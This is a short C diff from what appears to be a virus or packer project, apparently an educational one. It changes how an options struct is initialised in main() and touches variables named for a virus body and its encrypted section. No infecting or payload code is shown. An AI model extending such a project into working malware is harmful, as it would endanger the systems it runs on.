@@ -86,14 +86,13 @@ int set_garbage_infos(){
 }
 
 int main(int ac, char **av){
-	(void)ac;
-	(void)av;
-
 	char *virus;
 	size_t virus_len;
 	size_t crypt_off;
 	size_t crypt_len;
-	struct s_opt opt = {FALSE, FALSE, FALSE};
+	struct s_opt opt;
+	ft_bzero(&opt, sizeof(opt));
+
 	if (!set_garbage_infos())
 		return 2;
 	if (get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len) == FALSE)
